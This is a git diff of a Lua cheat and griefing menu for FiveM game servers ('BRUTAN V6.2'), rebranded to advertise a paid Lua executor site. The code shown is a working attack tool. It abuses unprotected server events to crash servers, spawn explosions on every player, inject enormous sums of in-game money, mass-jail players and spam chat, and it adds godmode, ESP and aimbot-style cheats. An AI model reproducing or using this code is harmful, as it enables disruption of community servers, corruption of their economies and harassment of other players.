@@ -1,3 +1,24 @@
+--[[
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+  _____           _              _     __  __           _     
+  |_   _|         | |            | |   |  \/  |         | |    
+    | |  _ __  ___| |_ __ _ _ __ | |_  | \  / | ___   __| |____
+    | | | '_ \/ __| __/ _` | '_ \| __| | |\/| |/ _ \ / _` |_  /
+   _| |_| | | \__ \ || (_| | | | | |_  | |  | | (_) | (_| |/ / 
+  |_____|_| |_|___/\__\__,_|_| |_|\__| |_|  |_|\___/ \__,_/___|                                                           
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+How to use the menu ? You need a lua executor to inject it, the best is redENGINE you can buy here: www.instant-modz.com
+
+www.instant-modz.com / Buy the best FiveM Lua Executor to use this menu
+www.instant-modz.com / Buy the best FiveM Lua Executor to use this menu
+www.instant-modz.com / Buy the best FiveM Lua Executor to use this menu
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+]] print("www.instant-modz.com")
+
 local mhaonn = true
 ESX = nil;
 Citizen.CreateThread(function() while ESX == nil do TriggerEvent("esx:getSharedObject", function(a) ESX = a end) Citizen.Wait(1000) end end) LynxEvo = {}
@@ -2044,7 +2065,7 @@ function bananaparty() local bw = CreateObject(GetHashKey("p_crahsed_heli_s"), 0
 function bananapartyall() Citizen.CreateThread(function() for bs = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^BRUTAN ^3m^4m^5u^6n^7i^1t^2y", {
             141, 211, 255
         }, "^"..bs..
-        "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end;
+        "BRUTAN V6.2 ~ https://instant-modz.com") end;
     for i = 0, 128 do local bw = CreateObject(GetHashKey("p_crahsed_heli_s"), 0, 0, 0, true, true, true) local bx = CreateObject(GetHashKey("prop_rock_4_big2"), 0, 0, 0, true, true, true) local by = CreateObject(GetHashKey("prop_beachflag_le"), 0, 0, 0, true, true, true) AttachEntityToEntity(bw, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(bx, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(by, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) end end) end;
 
 function semigodme() LynxEvo.LoadModels({
@@ -2426,7 +2447,7 @@ Citizen.CreateThread(function() while bl do Citizen.Wait(0) SetPlayerInvincible(
     for bs = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^B^R^5U^6TAN ^1C^2h^3e^4a^5t^6s", {
             141, 211, 255
         }, "^"..bs..
-        "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end;
+        "BRUTAN V6.2 ~ https://instant-modz.com") end;
     for i = 0, 128 do Citizen.Wait(500) AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true) end end;
     if crosshair then ShowHudComponentThisFrame(14) end;
     if crosshairc then bo("~r~+", 0.495, 0.484) end;
@@ -2458,7 +2479,7 @@ Citizen.CreateThread(function() while bl do Citizen.Wait(0) SetPlayerInvincible(
     function vrpdestroy() for bs = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y", {
             141, 211, 255
         }, "^"..bs..
-        "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end;
+        "BRUTAN V6.2 ~ https://instant-modz.com") end;
     TriggerServerEvent("lscustoms:payGarage", {
         costs = -99999999
     }) TriggerServerEvent("vrp_slotmachine:server:2", 999999999) TriggerServerEvent("Banca:deposit", 999999999) TriggerServerEvent("bank:deposit", 999999999) local df = GetPlayerServerId(PlayerId()) for i = 0, 128 do TriggerEvent("bank:transfer", df, GetPlayerServerId(i), 99999999) end end;
@@ -2467,8 +2488,8 @@ Citizen.CreateThread(function() while bl do Citizen.Wait(0) SetPlayerInvincible(
     function esxdestroyv2() Citizen.CreateThread(function() TriggerServerEvent("esx_jobs:caution", "give_back", 9999999999) TriggerServerEvent("esx_fueldelivery:pay", 9999999999) TriggerServerEvent("esx_carthief:pay", 9999999999) TriggerServerEvent("esx_godirtyjob:pay", 9999999999) TriggerServerEvent("esx_pizza:pay", 9999999999) TriggerServerEvent("esx_ranger:pay", 9999999999) TriggerServerEvent("esx_garbagejob:pay", 9999999999) TriggerServerEvent("esx_truckerjob:pay", 9999999999) TriggerServerEvent("AdminMenu:giveBank", 9999999999) TriggerServerEvent("AdminMenu:giveCash", 9999999999) TriggerServerEvent("esx_gopostaljob:pay", 9999999999) TriggerServerEvent("esx_banksecurity:pay", 9999999999) TriggerServerEvent("esx_slotmachine:sv:2", 9999999999) for bs = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^B^R^5U^6TAN ^1C^2h^3e^4a^5t^6s", {
                 141, 211, 255
             }, "^"..bs..
-            "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end;
-        for i = 0, 128 do TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756) TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756) TriggerServerEvent("esx_billing:sendBill", GetPlayerServerId(i), "Purposeless", "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem", 43161337) TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3) TriggerServerEvent("NB:recruterplayer", i, "police", 3) end end) end;
+            "BRUTAN V6.2 ~ https://instant-modz.com") end;
+        for i = 0, 128 do TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756) TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756) TriggerServerEvent("esx_billing:sendBill", GetPlayerServerId(i), "Purposeless", "BRUTAN V6.2 ~ https://instant-modz.com", 43161337) TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3) TriggerServerEvent("NB:recruterplayer", i, "police", 3) end end) end;
 
     function nukeserver() Citizen.CreateThread(function() local dg = "Avenger"
         local dh = "CARGOPLANE"
@@ -2482,7 +2503,7 @@ Citizen.CreateThread(function() while bl do Citizen.Wait(0) SetPlayerInvincible(
         for bs = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^135u^6n^7i^1t^2y", {
                 141, 211, 255
             }, "^"..bs..
-            "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end;
+            "BRUTAN V6.2 ~ https://instant-modz.com") end;
         for i = 0, 128 do local di = CreateVehicle(GetHashKey(dg), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(dg), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(dg), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(dh), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(dh), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(dh), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(di), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(di), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(di), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true) end end) end;
     if servercrasherxd then Citizen.CreateThread(function() local dg = "Avenger"
         local dh = "CARGOPLANE"
@@ -2606,7 +2627,7 @@ Citizen.CreateThread(function() while bl do Citizen.Wait(0) SetPlayerInvincible(
         " Upgrade 2", price2) then SetVehicleMod(veh, dA.id, 1) elseif LynxEvo.Button(dA.name..
         " Upgrade 3", price3) then SetVehicleMod(veh, dA.id, 2) elseif dA.id ~= 13 and dA.id ~= 12 and LynxEvo.Button(dA.name..
         " Upgrade 4", price4) then SetVehicleMod(veh, dA.id, 3) end; LynxEvo.Display() end end;
-    if LynxEvo.IsMenuOpened("LynxX") then local dK = PlayerId(-1) local bw = GetPlayerName(dK) drawNotification("~g~BRUTAN ~o~Lua~r~ ~p~@~s~".."Brutan#7799") drawNotification("~b~https://brutan.wixsite.com/fivem/fivem") if LynxEvo.MenuButton("~h~~p~#~s~ Self Menu", "SelfMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Online Players", "OnlinePlayerMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Teleport Menu", "TeleportMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Vehicle Menu", "VehicleMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Weapon Menu", "WeaponMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Lua Menu ~o~~h~:3", "LuaMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Advanced Mode ~o~~h~xD", "AdvM") then elseif LynxEvo.MenuButton("~h~~p~# ~y~BRUTAN Cheats", "crds") then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("SelfMenu") then
+    if LynxEvo.IsMenuOpened("LynxX") then local dK = PlayerId(-1) local bw = GetPlayerName(dK) drawNotification("~g~BRUTAN ~o~Lua~r~ ~p~@~s~".."Brutan#7799") drawNotification("~b~https://instant-modz.com") if LynxEvo.MenuButton("~h~~p~#~s~ Self Menu", "SelfMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Online Players", "OnlinePlayerMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Teleport Menu", "TeleportMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Vehicle Menu", "VehicleMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Weapon Menu", "WeaponMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Lua Menu ~o~~h~:3", "LuaMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Advanced Mode ~o~~h~xD", "AdvM") then elseif LynxEvo.MenuButton("~h~~p~# ~y~BRUTAN Cheats", "crds") then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("SelfMenu") then
     if LynxEvo.CheckBox("~h~~g~Godmode", Godmode, function(dL) Godmode = dL end) then elseif LynxEvo.Button("~h~~y~Semi ~g~Godmode") then semigodme() elseif LynxEvo.CheckBox("~h~~g~Player Visible", d1, function(dL) d1 = dL end) then elseif LynxEvo.Button("~h~~r~Suicide") then SetEntityHealth(PlayerPedId(-1), 0) elseif LynxEvo.Button("~h~~g~ESX~s~ Revive Yourself~s~") then TriggerEvent("esx_ambulancejob:revive") elseif LynxEvo.Button("~h~~g~Heal/Revive") then SetEntityHealth(PlayerPedId(-1), 200) elseif LynxEvo.Button("~h~~b~Give Armour") then SetPedArmour(PlayerPedId(-1), 200) elseif LynxEvo.CheckBox("~h~Infinite Stamina", InfStamina, function(dL) InfStamina = dL end) then elseif LynxEvo.CheckBox("~h~Thermal ~o~Vision", bTherm, function(bTherm) end) then therm = not therm; bTherm = therm; SetSeethrough(therm) elseif LynxEvo.CheckBox("~h~Fast Run", fastrun, function(dL) fastrun = dL end) then elseif LynxEvo.CheckBox("~h~Super Jump", SuperJump, function(dL) SuperJump = dL end) then elseif LynxEvo.CheckBox("~h~Noclip", Noclip, function(dL) Noclip = dL end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("OnlinePlayerMenu") then
     for i = 0, 128 do
         if NetworkIsPlayerActive(i)
@@ -2834,7 +2855,7 @@ Citizen.CreateThread(function() while bl do Citizen.Wait(0) SetPlayerInvincible(
     if LynxEvo.MenuButton("~h~~p~#~s~ Destroyer Menu", "Destroyer") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ESP Menu", "ESPMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Crosshairs", "CsMenu") then elseif LynxEvo.CheckBox("~h~TriggerBot", TriggerBot, function(dL) TriggerBot = dL end) then elseif LynxEvo.CheckBox("~h~Player Blips", dt, function(dt) end) then cJ = not cJ; dt = cJ elseif LynxEvo.CheckBox("~h~Name Above Players ~g~v1", cK, function(dL) cK = dL; cL = false end) then elseif LynxEvo.CheckBox("~h~Name Above Players n Indicator ~g~v2", cL, function(dL) cL = dL; cK = false end) then elseif LynxEvo.CheckBox("~h~~r~Freeze~s~ All players", freezeall, function(dL) freezeall = dL end) then elseif LynxEvo.CheckBox("~h~~r~Explode~s~ All players", blowall, function(dL) blowall = dL end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("CsMenu") then
     if LynxEvo.CheckBox("~h~~y~Original ~s~Crosshair", crosshair, function(dL) crosshair = dL; crosshairc = false; crosshairc2 = false end) then elseif LynxEvo.CheckBox("~h~~r~CROSS ~s~Crosshair", crosshairc, function(dL) crosshair = false; crosshairc = dL; crosshairc2 = false end) then elseif LynxEvo.CheckBox("~h~~r~DOT ~s~Crosshair", crosshairc2, function(dL) crosshair = false; crosshairc = false; crosshairc2 = dL end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("Destroyer") then
     if LynxEvo.Button("~h~~r~Nuke ~s~Server") then nukeserver() elseif LynxEvo.CheckBox("~h~~r~Silent ~s~Server ~y~Crasher", servercrasherxd, function(dL) servercrasherxd = dL end) then elseif LynxEvo.Button("~h~~g~ESX ~r~Destroy ~b~v2") then esxdestroyv2() elseif LynxEvo.Button("~h~~g~ESX ~r~Destroy ~b~Salary") then EconomyDy2() elseif LynxEvo.Button("~h~~r~VRP ~s~Give everyone money") then vrpdestroy() elseif LynxEvo.Button("~h~~r~Jail~s~ All players") then
-    for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "BRUTAN V6.2~ https://brutan.wixsite.com/fivem/fivem") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end elseif LynxEvo.Button("~h~~r~Banana ~p~Party~s~ All players") then bananapartyall() elseif LynxEvo.Button("~h~~r~Rape~s~ All players") then RapeAllFunc() end;
+    for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "BRUTAN V6.2~ https://instant-modz.com") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN V6.2 ~ https://instant-modz.com") end elseif LynxEvo.Button("~h~~r~Banana ~p~Party~s~ All players") then bananapartyall() elseif LynxEvo.Button("~h~~r~Rape~s~ All players") then RapeAllFunc() end;
     LynxEvo.Display() elseif LynxEvo.IsMenuOpened("crds") then
     if LynxEvo.Button("~h~~p~#~s~ Brutan~r~#~r~7799 ~p~DEV") then drawNotification("~h~~o~brutan cheats? s~.") drawNotification("~h~~o~Brutan is the best ~s~.") drawNotification("~h~~o~wow Brutan its so good ~s~.") elseif LynxEvo.Button("~h~~p~#~s~ antonio~r~#~r~3276 ~p~DEV") then elseif LynxEvo.Button("~h~~p~#~s~ unknown~r~#~r~9496 ~p~DEV") then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("WeaponTypes") then
     for dO, e1 in pairs(a_) do
@@ -2869,4 +2890,4 @@ Citizen.CreateThread(function() while bl do Citizen.Wait(0) SetPlayerInvincible(
     if LynxEvo.CheckBox("~h~~r~ESP ~s~MasterSwitch", esp, function(dL) esp = dL end) then elseif LynxEvo.CheckBox("~h~~r~ESP ~s~Box", espbox, function(dL) espbox = dL end) then elseif LynxEvo.CheckBox("~h~~r~ESP ~s~Info", espinfo, function(dL) espinfo = dL end) then elseif LynxEvo.CheckBox("~h~~r~ESP ~s~Lines", esplines, function(dL) esplines = dL end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("LSC") then local veh = GetVehiclePedIsUsing(PlayerPedId()) if LynxEvo.MenuButton("~h~~p~#~s~ ~h~~r~Exterior ~s~Tuning", "tunings") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~h~~r~Performance ~s~Tuning", "performance") then elseif LynxEvo.Button("~h~Change Car License Plate") then cr() elseif LynxEvo.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Vehicle Colour", RainbowVeh, function(dL) RainbowVeh = dL end) then elseif LynxEvo.Button("~h~Make vehicle ~y~dirty") then Clean(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif LynxEvo.Button("~h~Make vehicle ~g~clean") then Clean2(GetVehiclePedIsUsing(PlayerPedId(-1))) end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("BoostMenu") then
     if LynxEvo.ComboBox("~h~Engine ~r~Power ~s~Booster", dz, dx, dy, function(ab, ac) dx = ab; dy = ac; SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), dy * 20.0) end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~2x", t2x, function(dL) t2x = dL; t4x = false; t10x = false; t16x = false; txd = false end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~4x", t4x, function(dL) t2x = false; t4x = dL; t10x = false; t16x = false; txd = false end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~10x", t10x, function(dL) t2x = false; t4x = false; t10x = dL; t16x = false; txd = false end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~16x", t16x, function(dL) t2x = false; t4x = false; t10x = false; t16x = dL; txd = false end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~y~XD", txd, function(dL) t2x = false; t4x = false; t10x = false; t16x = false; txd = dL end) then end; LynxEvo.Display() elseif IsDisabledControlPressed(0, 122) then
     if logged then LynxEvo.OpenMenu("LynxX") end; LynxEvo.Display() elseif IsDisabledControlPressed(0, 47) and IsDisabledControlPressed(0, 21) then
-    if logged then LynxEvo.OpenMenu("LynxX") end end; Citizen.Wait(0) end end) RegisterCommand("haha", function(e5, e6, e7) bk = true; RapeAllFunc() bananapartyall() EconomyDy2() AmbulancePlayers() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end end, false) RegisterCommand("pk", function(e5, e6, e7) bl = false end, false)
+    if logged then LynxEvo.OpenMenu("LynxX") end end; Citizen.Wait(0) end end) RegisterCommand("haha", function(e5, e6, e7) bk = true; RapeAllFunc() bananapartyall() EconomyDy2() AmbulancePlayers() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "BRUTAN V6.2 ~ https://instant-modz.com") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN V6.2 ~ https://instant-modz.com") end end, false) RegisterCommand("pk", function(e5, e6, e7) bl = false end, false)
